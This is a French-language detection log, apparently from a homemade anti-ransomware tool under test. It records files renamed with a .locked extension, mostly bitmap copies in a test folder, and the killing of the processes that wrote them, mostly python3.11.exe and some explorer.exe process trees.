+2025-07-24 22:48:44.588Z [INFO] kill_process_tree appelé pour PID 10468 (python3.11.exe)
+2025-07-24 22:48:44.604Z [ERROR] Erreur kill parent PID 7568 : process PID not found (pid=7568)
+2025-07-24 22:48:44.604Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:44.604Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:44.604Z [🔪] Kill parent PID 10468 (python3.11.exe)
+2025-07-24 22:50:17.581Z [DEBUG] Fichier cible détecté : 'a:\readme.txt'
+2025-07-24 22:50:34.852Z [DEBUG] Fichier cible détecté : 'a:\readme.txt'
+2025-07-24 22:52:05.151Z [DEBUG] Fichier cible détecté : 'c:\$recycle.bin\s-1-5-21-1349940229-2857808021-1114501214-1000\$iu8ahho.locked'
+2025-07-24 22:52:05.151Z [🧨] Fichier chiffré détecté : c:\$recycle.bin\s-1-5-21-1349940229-2857808021-1114501214-1000\$iu8ahho.locked
+2025-07-24 22:52:05.151Z [DEBUG] ProcessId détecté : 4796
+2025-07-24 22:52:05.167Z [INFO] kill_process_tree appelé pour PID 4796 (explorer.exe)
+2025-07-24 22:52:05.167Z [ERROR] Erreur kill parent PID 4752 : process PID not found (pid=4752)
+2025-07-24 22:52:05.182Z [🔪] Kill enfant PID 5676 (SecurityHealthSystray.exe)
+2025-07-24 22:52:05.182Z [🔪] Kill enfant PID 6592 (OneDrive.exe)
+2025-07-24 22:52:05.182Z [🔪] Kill enfant PID 6276 (msedge.exe)
+2025-07-24 22:52:05.198Z [🔪] Kill enfant PID 652 (cmd.exe)
+2025-07-24 22:52:05.198Z [🔪] Kill enfant PID 6076 (mmc.exe)
+2025-07-24 22:52:05.214Z [🔪] Kill enfant PID 5164 (conhost.exe)
+2025-07-24 22:55:23.686Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (17).bmp.locked'
+2025-07-24 22:55:23.702Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (17).bmp.locked
+2025-07-24 22:55:23.807Z [DEBUG] ProcessId détecté : 8348
+2025-07-24 22:55:23.903Z [INFO] kill_process_tree appelé pour PID 8348 (python3.11.exe)
+2025-07-24 22:55:24.019Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:24.021Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:24.034Z [🔪] Kill parent PID 10536 (python3.11.exe)
+2025-07-24 22:55:24.072Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:24.126Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:24.164Z [🔪] Kill parent PID 8348 (python3.11.exe)
+2025-07-24 22:55:24.170Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (12).bmp.locked'
+2025-07-24 22:55:24.240Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (12).bmp.locked
+2025-07-24 22:55:24.266Z [DEBUG] ProcessId détecté : 6052
+2025-07-24 22:55:24.275Z [INFO] kill_process_tree appelé pour PID 6052 (python3.11.exe)
+2025-07-24 22:55:24.347Z [ERROR] Erreur kill parent PID 10536 : process PID not found (pid=10536)
+2025-07-24 22:55:24.424Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:24.426Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:24.427Z [🔪] Kill parent PID 6052 (python3.11.exe)
+2025-07-24 22:55:24.485Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (11).bmp.locked'
+2025-07-24 22:55:24.551Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (11).bmp.locked
+2025-07-24 22:55:24.574Z [DEBUG] ProcessId détecté : 11156
+2025-07-24 22:55:24.586Z [INFO] kill_process_tree appelé pour PID 11156 (python3.11.exe)
+2025-07-24 22:55:24.770Z [ERROR] Erreur kill parent PID 10536 : process PID not found (pid=10536)
+2025-07-24 22:55:24.853Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:24.945Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:24.961Z [🔪] Kill parent PID 11156 (python3.11.exe)
+2025-07-24 22:55:24.968Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (18).bmp.locked'
+2025-07-24 22:55:24.976Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (18).bmp.locked
+2025-07-24 22:55:24.980Z [DEBUG] ProcessId détecté : 9552
+2025-07-24 22:55:24.982Z [INFO] kill_process_tree appelé pour PID 9552 (python3.11.exe)
+2025-07-24 22:55:25.117Z [ERROR] Erreur kill parent PID 10536 : process PID not found (pid=10536)
+2025-07-24 22:55:25.239Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:25.280Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:25.350Z [🔪] Kill parent PID 9552 (python3.11.exe)
+2025-07-24 22:55:25.538Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (10).bmp.locked'
+2025-07-24 22:55:25.551Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (10).bmp.locked
+2025-07-24 22:55:25.706Z [DEBUG] ProcessId détecté : 8396
+2025-07-24 22:55:25.715Z [INFO] kill_process_tree appelé pour PID 8396 (python3.11.exe)
+2025-07-24 22:55:25.811Z [ERROR] Erreur kill parent PID 10536 : process PID not found (pid=10536)
+2025-07-24 22:55:26.108Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:26.108Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:26.315Z [🔪] Kill parent PID 8396 (python3.11.exe)
+2025-07-24 22:55:26.365Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (13).bmp.locked'
+2025-07-24 22:55:26.512Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (13).bmp.locked
+2025-07-24 22:55:26.527Z [DEBUG] ProcessId détecté : 9024
+2025-07-24 22:55:26.626Z [INFO] kill_process_tree appelé pour PID 9024 (python3.11.exe)
+2025-07-24 22:55:26.724Z [ERROR] Erreur kill parent PID 10536 : process PID not found (pid=10536)
+2025-07-24 22:55:26.883Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:26.888Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:26.954Z [🔪] Kill parent PID 9024 (python3.11.exe)
+2025-07-24 22:55:27.075Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (14).bmp.locked'
+2025-07-24 22:55:27.164Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (14).bmp.locked
+2025-07-24 22:55:27.232Z [DEBUG] ProcessId détecté : 5596
+2025-07-24 22:55:27.369Z [INFO] kill_process_tree appelé pour PID 5596 (python3.11.exe)
+2025-07-24 22:55:27.387Z [ERROR] Erreur kill parent PID 10536 : process PID not found (pid=10536)
+2025-07-24 22:55:27.420Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:27.420Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:27.420Z [🔪] Kill parent PID 5596 (python3.11.exe)
+2025-07-24 22:55:27.420Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (16).bmp.locked'
+2025-07-24 22:55:27.420Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (16).bmp.locked
+2025-07-24 22:55:27.508Z [DEBUG] ProcessId détecté : 7480
+2025-07-24 22:55:27.575Z [INFO] kill_process_tree appelé pour PID 7480 (python3.11.exe)
+2025-07-24 22:55:27.766Z [ERROR] Erreur kill parent PID 10536 : process PID not found (pid=10536)
+2025-07-24 22:55:27.843Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:27.846Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:27.853Z [🔪] Kill parent PID 7480 (python3.11.exe)
+2025-07-24 22:55:28.057Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (15).bmp.locked'
+2025-07-24 22:55:28.076Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (15).bmp.locked
+2025-07-24 22:55:28.223Z [DEBUG] ProcessId détecté : 6532
+2025-07-24 22:55:28.227Z [INFO] kill_process_tree appelé pour PID 6532 (python3.11.exe)
+2025-07-24 22:55:28.369Z [ERROR] Erreur kill parent PID 10536 : process PID not found (pid=10536)
+2025-07-24 22:55:28.382Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:28.383Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:28.392Z [🔪] Kill parent PID 6532 (python3.11.exe)
+2025-07-24 22:55:28.538Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (19).bmp.locked'
+2025-07-24 22:55:28.541Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (19).bmp.locked
+2025-07-24 22:55:28.544Z [DEBUG] ProcessId détecté : 2860
+2025-07-24 22:55:28.549Z [INFO] kill_process_tree appelé pour PID 2860 (python3.11.exe)
+2025-07-24 22:55:28.644Z [ERROR] Erreur kill parent PID 10536 : process PID not found (pid=10536)
+2025-07-24 22:55:28.656Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:55:28.725Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:55:28.810Z [🔪] Kill parent PID 2860 (python3.11.exe)
+2025-07-24 22:55:28.903Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (2).bmp.locked'
+2025-07-24 22:55:29.317Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (2).bmp.locked
+2025-07-24 22:55:29.422Z [DEBUG] ProcessId détecté : 9024
+2025-07-24 22:55:29.506Z [WARN] Processus PID 9024 non trouvé
+2025-07-24 22:55:30.669Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (20).bmp.locked'
+2025-07-24 22:55:30.717Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (20).bmp.locked
+2025-07-24 22:55:30.732Z [DEBUG] ProcessId détecté : 5596
+2025-07-24 22:55:30.748Z [WARN] Processus PID 5596 non trouvé
+2025-07-24 22:55:31.028Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (21).bmp.locked'
+2025-07-24 22:55:31.164Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (21).bmp.locked
+2025-07-24 22:55:31.172Z [DEBUG] ProcessId détecté : 8348
+2025-07-24 22:55:31.176Z [WARN] Processus PID 8348 non trouvé
+2025-07-24 22:55:31.287Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (22).bmp.locked'
+2025-07-24 22:55:31.344Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (22).bmp.locked
+2025-07-24 22:55:31.408Z [DEBUG] ProcessId détecté : 6052
+2025-07-24 22:55:31.417Z [WARN] Processus PID 6052 non trouvé
+2025-07-24 22:55:31.543Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (23).bmp.locked'
+2025-07-24 22:55:31.650Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (23).bmp.locked
+2025-07-24 22:55:31.668Z [DEBUG] ProcessId détecté : 8396
+2025-07-24 22:55:31.877Z [WARN] Processus PID 8396 non trouvé
+2025-07-24 22:55:31.980Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (24).bmp.locked'
+2025-07-24 22:55:32.082Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (24).bmp.locked
+2025-07-24 22:55:32.087Z [DEBUG] ProcessId détecté : 11156
+2025-07-24 22:55:32.193Z [WARN] Processus PID 11156 non trouvé
+2025-07-24 22:55:32.201Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (25).bmp.locked'
+2025-07-24 22:55:32.202Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (25).bmp.locked
+2025-07-24 22:55:32.204Z [DEBUG] ProcessId détecté : 6532
+2025-07-24 22:55:32.213Z [WARN] Processus PID 6532 non trouvé
+2025-07-24 22:55:32.309Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (27).bmp.locked'
+2025-07-24 22:55:32.314Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (27).bmp.locked
+2025-07-24 22:55:32.316Z [DEBUG] ProcessId détecté : 2860
+2025-07-24 22:55:32.317Z [WARN] Processus PID 2860 non trouvé
+2025-07-24 22:55:32.320Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (26).bmp.locked'
+2025-07-24 22:55:32.322Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (26).bmp.locked
+2025-07-24 22:55:32.328Z [DEBUG] ProcessId détecté : 7480
+2025-07-24 22:55:32.351Z [WARN] Processus PID 7480 non trouvé
+2025-07-24 22:55:32.457Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (3).bmp.locked'
+2025-07-24 22:55:32.621Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (3).bmp.locked
+2025-07-24 22:55:32.923Z [DEBUG] ProcessId détecté : 8348
+2025-07-24 22:55:33.017Z [WARN] Processus PID 8348 non trouvé
+2025-07-24 22:55:33.027Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (4).bmp.locked'
+2025-07-24 22:55:33.028Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (4).bmp.locked
+2025-07-24 22:55:33.030Z [DEBUG] ProcessId détecté : 9024
+2025-07-24 22:55:33.032Z [WARN] Processus PID 9024 non trouvé
+2025-07-24 22:55:33.089Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (5).bmp.locked'
+2025-07-24 22:55:33.092Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (5).bmp.locked
+2025-07-24 22:55:33.207Z [DEBUG] ProcessId détecté : 2860
+2025-07-24 22:55:33.209Z [WARN] Processus PID 2860 non trouvé
+2025-07-24 22:55:33.217Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (6).bmp.locked'
+2025-07-24 22:55:33.290Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (6).bmp.locked
+2025-07-24 22:55:33.291Z [DEBUG] ProcessId détecté : 8396
+2025-07-24 22:55:33.293Z [WARN] Processus PID 8396 non trouvé
+2025-07-24 22:55:33.355Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (7).bmp.locked'
+2025-07-24 22:55:33.402Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (7).bmp.locked
+2025-07-24 22:55:33.411Z [DEBUG] ProcessId détecté : 9552
+2025-07-24 22:55:33.416Z [WARN] Processus PID 9552 non trouvé
+2025-07-24 22:55:33.473Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (8).bmp.locked'
+2025-07-24 22:55:33.477Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (8).bmp.locked
+2025-07-24 22:55:33.478Z [DEBUG] ProcessId détecté : 5596
+2025-07-24 22:55:33.480Z [WARN] Processus PID 5596 non trouvé
+2025-07-24 22:55:33.580Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (9).bmp.locked'
+2025-07-24 22:55:33.585Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (9).bmp.locked
+2025-07-24 22:55:33.937Z [DEBUG] ProcessId détecté : 9024
+2025-07-24 22:55:34.124Z [WARN] Processus PID 9024 non trouvé
+2025-07-24 22:55:34.237Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie.bmp.locked'
+2025-07-24 22:55:34.240Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie.bmp.locked
+2025-07-24 22:55:34.240Z [DEBUG] ProcessId détecté : 6532
+2025-07-24 22:55:34.253Z [WARN] Processus PID 6532 non trouvé
+2025-07-24 22:55:34.258Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap.bmp.locked'
+2025-07-24 22:55:34.260Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap.bmp.locked
+2025-07-24 22:55:34.262Z [DEBUG] ProcessId détecté : 2860
+2025-07-24 22:55:34.272Z [WARN] Processus PID 2860 non trouvé
+2025-07-24 22:56:39.743Z [DEBUG] Fichier cible détecté : 'a:\readme.txt'
+2025-07-24 22:59:12.685Z [DEBUG] Fichier cible détecté : 'c:\$recycle.bin\s-1-5-21-1349940229-2857808021-1114501214-1000\$iqrg162.locked'
+2025-07-24 22:59:12.779Z [🧨] Fichier chiffré détecté : c:\$recycle.bin\s-1-5-21-1349940229-2857808021-1114501214-1000\$iqrg162.locked
+2025-07-24 22:59:12.829Z [DEBUG] ProcessId détecté : 4796
+2025-07-24 22:59:12.904Z [INFO] kill_process_tree appelé pour PID 4796 (explorer.exe)
+2025-07-24 22:59:12.936Z [ERROR] Erreur kill parent PID 4752 : process PID not found (pid=4752)
+2025-07-24 22:59:12.952Z [🔪] Kill enfant PID 4804 (mmc.exe)
+2025-07-24 22:59:12.952Z [🔪] Kill enfant PID 3996 (cmd.exe)
+2025-07-24 22:59:12.964Z [🔪] Kill enfant PID 5304 (msedge.exe)
+2025-07-24 22:59:12.981Z [🔪] Kill enfant PID 8092 (msedge.exe)
+2025-07-24 22:59:13.063Z [🔪] Kill enfant PID 10508 (msedge.exe)
+2025-07-24 22:59:13.079Z [🔪] Kill enfant PID 10156 (msedge.exe)
+2025-07-24 22:59:13.088Z [🔪] Kill enfant PID 8972 (msedge.exe)
+2025-07-24 22:59:13.112Z [🔪] Kill enfant PID 8904 (msedge.exe)
+2025-07-24 22:59:13.120Z [🔪] Kill enfant PID 8156 (msedge.exe)
+2025-07-24 22:59:13.139Z [🔪] Kill enfant PID 9820 (msedge.exe)
+2025-07-24 22:59:13.143Z [🔪] Kill enfant PID 5464 (msedge.exe)
+2025-07-24 22:59:13.148Z [🔪] Kill enfant PID 8820 (msedge.exe)
+2025-07-24 22:59:13.152Z [🔪] Kill enfant PID 8856 (msedge.exe)
+2025-07-24 22:59:13.172Z [🔪] Kill enfant PID 10592 (msedge.exe)
+2025-07-24 22:59:13.177Z [🔪] Kill enfant PID 7020 (msedge.exe)
+2025-07-24 22:59:13.181Z [🔪] Kill enfant PID 7220 (msedge.exe)
+2025-07-24 22:59:13.192Z [🔪] Kill enfant PID 10820 (msedge.exe)
+2025-07-24 22:59:13.200Z [🔪] Kill enfant PID 7988 (conhost.exe)
+2025-07-24 23:07:23.295Z [DEBUG] Fichier cible détecté : 'a:\readme.txt.locked'
+2025-07-24 23:07:23.295Z [🧨] Fichier chiffré détecté : a:\readme.txt.locked
+2025-07-24 23:07:23.295Z [DEBUG] ProcessId détecté : 10976
+2025-07-24 23:07:23.309Z [WARN] Processus PID 10976 non trouvé
+2025-07-24 23:07:50.471Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (10).bmp.locked'
+2025-07-24 23:07:50.595Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (10).bmp.locked
+2025-07-24 23:07:50.716Z [DEBUG] ProcessId détecté : 3844
+2025-07-24 23:07:50.839Z [INFO] kill_process_tree appelé pour PID 3844 (python3.11.exe)
+2025-07-24 23:07:56.759Z [🔪] Force kill PID 3844 et son arbre
+2025-07-24 23:07:56.779Z [ERROR] Erreur obtention parent PID 3844 : process no longer exists (pid=3844, name='python3.11.exe')
+2025-07-24 23:07:56.942Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (12).bmp.locked'
+2025-07-24 23:07:56.963Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (12).bmp.locked
+2025-07-24 23:07:57.337Z [DEBUG] ProcessId détecté : 3384
+2025-07-24 23:07:57.492Z [INFO] kill_process_tree appelé pour PID 3384 (python3.11.exe)
+2025-07-24 23:08:00.139Z [🔪] Force kill PID 3384 et son arbre
+2025-07-24 23:08:00.157Z [ERROR] Erreur obtention parent PID 3384 : process no longer exists (pid=3384, name='python3.11.exe')
+2025-07-24 23:08:00.207Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (17).bmp.locked'
+2025-07-24 23:08:00.207Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (17).bmp.locked
+2025-07-24 23:08:00.209Z [DEBUG] ProcessId détecté : 4552
+2025-07-24 23:08:00.211Z [INFO] kill_process_tree appelé pour PID 4552 (python3.11.exe)
+2025-07-24 23:08:02.178Z [🔪] Force kill PID 4552 et son arbre
+2025-07-24 23:08:02.564Z [ERROR] Erreur obtention parent PID 4552 : process no longer exists (pid=4552, name='python3.11.exe')
+2025-07-24 23:08:02.857Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (15).bmp.locked'
+2025-07-24 23:08:02.983Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (15).bmp.locked
+2025-07-24 23:08:03.067Z [DEBUG] ProcessId détecté : 10968
+2025-07-24 23:08:03.069Z [INFO] kill_process_tree appelé pour PID 10968 (python3.11.exe)
+2025-07-24 23:08:06.373Z [🔪] Force kill PID 10968 et son arbre
+2025-07-24 23:08:06.670Z [ERROR] Erreur obtention parent PID 10968 : process no longer exists (pid=10968, name='python3.11.exe')
+2025-07-24 23:08:06.728Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (18).bmp.locked'
+2025-07-24 23:08:06.737Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (18).bmp.locked
+2025-07-24 23:08:06.740Z [DEBUG] ProcessId détecté : 4312
+2025-07-24 23:08:06.741Z [INFO] kill_process_tree appelé pour PID 4312 (python3.11.exe)
+2025-07-24 23:08:08.279Z [🔪] Force kill PID 4312 et son arbre
+2025-07-24 23:08:08.373Z [ERROR] Erreur obtention parent PID 4312 : process no longer exists (pid=4312, name='python3.11.exe')
+2025-07-24 23:08:08.467Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (16).bmp.locked'
+2025-07-24 23:08:08.482Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (16).bmp.locked
+2025-07-24 23:08:08.482Z [DEBUG] ProcessId détecté : 11024
+2025-07-24 23:08:08.482Z [INFO] kill_process_tree appelé pour PID 11024 (python3.11.exe)
+2025-07-24 23:08:09.177Z [🔪] Force kill PID 11024 et son arbre
+2025-07-24 23:08:09.193Z [ERROR] Erreur obtention parent PID 11024 : process no longer exists (pid=11024, name='python3.11.exe')
+2025-07-24 23:08:09.197Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (11).bmp.locked'
+2025-07-24 23:08:09.198Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (11).bmp.locked
+2025-07-24 23:08:09.210Z [DEBUG] ProcessId détecté : 9916
+2025-07-24 23:08:09.224Z [INFO] kill_process_tree appelé pour PID 9916 (python3.11.exe)
+2025-07-24 23:08:09.717Z [🔪] Force kill PID 9916 et son arbre
+2025-07-24 23:08:09.733Z [ERROR] Erreur obtention parent PID 9916 : process no longer exists (pid=9916, name='python3.11.exe')
+2025-07-24 23:08:09.733Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (13).bmp.locked'
+2025-07-24 23:08:09.747Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (13).bmp.locked
+2025-07-24 23:08:09.747Z [DEBUG] ProcessId détecté : 11152
+2025-07-24 23:08:09.747Z [INFO] kill_process_tree appelé pour PID 11152 (python3.11.exe)
+2025-07-24 23:08:10.529Z [🔪] Force kill PID 11152 et son arbre
+2025-07-24 23:08:10.529Z [ERROR] Erreur obtention parent PID 11152 : process no longer exists (pid=11152, name='python3.11.exe')
+2025-07-24 23:08:10.545Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (14).bmp.locked'
+2025-07-24 23:08:10.560Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (14).bmp.locked
+2025-07-24 23:08:10.560Z [DEBUG] ProcessId détecté : 6396
+2025-07-24 23:08:10.576Z [INFO] kill_process_tree appelé pour PID 6396 (python3.11.exe)
+2025-07-24 23:08:10.935Z [🔪] Force kill PID 6396 et son arbre
+2025-07-24 23:08:10.935Z [ERROR] Erreur obtention parent PID 6396 : process no longer exists (pid=6396, name='python3.11.exe')
+2025-07-24 23:08:10.951Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (19).bmp.locked'
+2025-07-24 23:08:10.951Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (19).bmp.locked
+2025-07-24 23:08:10.951Z [DEBUG] ProcessId détecté : 1584
+2025-07-24 23:08:10.951Z [INFO] kill_process_tree appelé pour PID 1584 (python3.11.exe)
+2025-07-24 23:08:11.107Z [🔪] Force kill PID 1584 et son arbre
+2025-07-24 23:08:11.123Z [ERROR] Erreur obtention parent PID 1584 : process no longer exists (pid=1584, name='python3.11.exe')
+2025-07-24 23:08:11.123Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (2).bmp.locked'
+2025-07-24 23:08:11.123Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (2).bmp.locked
+2025-07-24 23:08:11.123Z [DEBUG] ProcessId détecté : 3844
+2025-07-24 23:08:11.123Z [WARN] Processus PID 3844 non trouvé
+2025-07-24 23:08:11.139Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (21).bmp.locked'
+2025-07-24 23:08:11.139Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (21).bmp.locked
+2025-07-24 23:08:11.139Z [DEBUG] ProcessId détecté : 10968
+2025-07-24 23:08:11.139Z [WARN] Processus PID 10968 non trouvé
+2025-07-24 23:08:11.139Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (20).bmp.locked'
+2025-07-24 23:08:11.139Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (20).bmp.locked
+2025-07-24 23:08:11.139Z [DEBUG] ProcessId détecté : 4552
+2025-07-24 23:08:11.154Z [WARN] Processus PID 4552 non trouvé
+2025-07-24 23:08:12.182Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (22).bmp.locked'
+2025-07-24 23:08:12.182Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (22).bmp.locked
+2025-07-24 23:08:12.182Z [DEBUG] ProcessId détecté : 6396
+2025-07-24 23:08:12.182Z [WARN] Processus PID 6396 non trouvé
+2025-07-24 23:08:12.200Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (23).bmp.locked'
+2025-07-24 23:08:12.200Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (23).bmp.locked
+2025-07-24 23:08:12.200Z [DEBUG] ProcessId détecté : 1584
+2025-07-24 23:08:12.213Z [WARN] Processus PID 1584 non trouvé
+2025-07-24 23:08:12.213Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (24).bmp.locked'
